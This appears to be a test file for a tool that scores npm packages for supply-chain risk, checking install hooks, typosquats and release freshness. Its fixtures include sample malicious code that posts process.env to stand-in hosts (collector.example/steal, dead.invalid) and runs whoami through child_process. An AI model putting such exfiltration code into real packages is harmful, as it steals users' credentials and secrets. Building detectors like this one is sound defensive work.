import { test } from "node:test";
import assert from "node:assert/strict";
import { analyze } from "../src/analyze.js";
import { editDistance, typosquatTarget } from "../src/typosquat.js";
import { parseSpec } from "../src/registry.js";

const NOW = Date.now();
const daysAgo = (n) => new Date(NOW - n * 86_400_000).toISOString();

function fakePackage(overrides = {}) {
  return {
    name: "some-established-tool",
    version: "2.0.0",
    manifest: { scripts: {}, dependencies: {} },
    files: [],
    weeklyDownloads: 50_000,
    createdAt: daysAgo(900),
    versionPublishedAt: daysAgo(200),
    maintainers: [{ name: "a" }, { name: "b" }],
    readme: "x".repeat(500),
    ...overrides,
  };
}

test("clean established package is low-risk", () => {
  const report = analyze(fakePackage());
  assert.equal(report.verdict, "low-risk");
  assert.equal(report.findings.length, 0);
});

test("install hooks raise the score", () => {
  const report = analyze(
    fakePackage({
      manifest: { scripts: { postinstall: "node evil.js" }, dependencies: {} },
    }),
  );
  assert.equal(report.verdict, "caution");
  assert.match(report.findings[0].title, /postinstall/);
});

test("brand-new package with env+network exfil pattern is suspicious", () => {
  const source = `
    const data = JSON.stringify(process.env);
    fetch("https://collector.example/steal", { method: "POST", body: data });
  `;
  const report = analyze(
    fakePackage({
      createdAt: daysAgo(2),
      versionPublishedAt: daysAgo(1),
      weeklyDownloads: 12,
      maintainers: [{ name: "solo" }],
      readme: null,
      manifest: { scripts: { preinstall: "node index.js" }, dependencies: {} },
      files: [{ name: "package/index.js", size: source.length, data: Buffer.from(source) }],
    }),
  );
  assert.equal(report.verdict, "suspicious");
  assert.ok(report.score >= 50);
});

test("popularity discounts reputation findings on an old release", () => {
  // esbuild-shaped: huge install base, postinstall that fetches a binary,
  // release is months old. Should inform, not alarm.
  const source = `const cp = require("child_process"); fetch(process.env.MIRROR);`;
  const report = analyze(
    fakePackage({
      name: "established-bundler",
      createdAt: daysAgo(1200),
      versionPublishedAt: daysAgo(60),
      weeklyDownloads: 50_000_000,
      manifest: { scripts: { postinstall: "node install.js" }, dependencies: {} },
      files: [{ name: "package/install.js", size: source.length, data: Buffer.from(source) }],
    }),
  );
  assert.equal(report.verdict, "caution");
  assert.ok(report.score < report.rawScore, "score should be discounted");
});

test("popularity does NOT excuse dangerous code in a fresh release", () => {
  // Same package, same code — but published 6 hours ago. This is the
  // compromised-maintainer shape; the install base must not hide it.
  const source = `
    const cp = require("child_process");
    cp.execSync("whoami");
    fetch("https://dead.invalid/t", { method: "POST", body: JSON.stringify(process.env) });
  `;
  const report = analyze(
    fakePackage({
      name: "established-bundler",
      createdAt: daysAgo(1200),
      versionPublishedAt: new Date(NOW - 6 * 3_600_000).toISOString(),
      weeklyDownloads: 50_000_000,
      manifest: { scripts: { postinstall: "node install.js" }, dependencies: {} },
      files: [{ name: "package/install.js", size: source.length, data: Buffer.from(source) }],
    }),
  );
  assert.equal(report.freshRelease, true);
  assert.equal(report.verdict, "suspicious");
});

test("minified bundles don't trip obfuscation heuristics", () => {
  const minified = `!function(){eval("${"QUJD".repeat(80)}")}();`;
  const report = analyze(
    fakePackage({
      files: [
        { name: "package/dist/lib.min.js", size: minified.length, data: Buffer.from(minified) },
      ],
    }),
  );
  assert.equal(report.findings.length, 0);
});

test("typosquat of a popular name is flagged", () => {
  const report = analyze(fakePackage({ name: "expresss" }));
  assert.ok(report.findings.some((f) => /typosquat|edits from/.test(f.title + f.detail)));
});

test("editDistance handles transpositions", () => {
  assert.equal(editDistance("react", "raect"), 1);
  assert.equal(editDistance("lodash", "lodash"), 0);
});

test("popular packages are not their own typosquat", () => {
  assert.equal(typosquatTarget("react"), null);
  assert.equal(typosquatTarget("raect"), "react");
});

test("parseSpec splits scoped and versioned specs", () => {
  assert.deepEqual(parseSpec("react@18.2.0"), { name: "react", range: "18.2.0" });
  assert.deepEqual(parseSpec("@scope/pkg@1.0.0"), { name: "@scope/pkg", range: "1.0.0" });
  assert.deepEqual(parseSpec("react"), { name: "react", range: "latest" });
});
